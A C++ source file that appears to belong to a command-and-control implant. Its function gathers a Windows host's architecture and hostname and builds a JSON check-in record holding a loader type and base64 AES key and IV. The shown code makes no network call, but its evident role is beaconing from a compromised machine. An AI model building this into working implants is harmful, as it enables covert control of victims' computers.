#include "core/handler.hpp"

namespace Handler
{
    std::wstring GetInitialInfoJSON()
    {
        std::wstring wOS = L"windows";
        std::wstring wArch = L"";
        std::wstring wHostname = L"";
        std::wstring wPayloadType = PAYLOAD_TYPE_W;
        std::wstring wAesKey = AES_KEY_BASE64_W;
        std::wstring wAesIV = AES_IV_BASE64_W;      

        // Get architecture
        SYSTEM_INFO systemInfo;
        GetSystemInfo(&systemInfo);
        wArch = System::Arch::GetName(systemInfo.wProcessorArchitecture);

        // Get hostname and convert it to wstring
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2,2), &wsaData) == 0) 
        {
            char szHostname[256] = "";
            gethostname(szHostname, 256);
            std::string sHostname(szHostname);
            wHostname = Utils::Convert::UTF8Decode(sHostname);
        }

        std::wstring wJson = L"{";
        wJson += L"\"os\":\"" + wOS + L"\"";
        wJson += L",";
        wJson += L"\"arch\":\"" + wArch + L"\"";
        wJson += L",";
        wJson += L"\"hostname\":\"" + wHostname + L"\"";
        wJson += L",";
        wJson += L"\"loaderType\":\"" + wPayloadType + L"\"";
        wJson += L",";
        wJson += L"\"aesKey\":\"" + wAesKey + L"\"";
        wJson += L",";
        wJson += L"\"aesIV\":\"" + wAesIV + L"\"";
        wJson += L"}";

        return wJson;
    }
}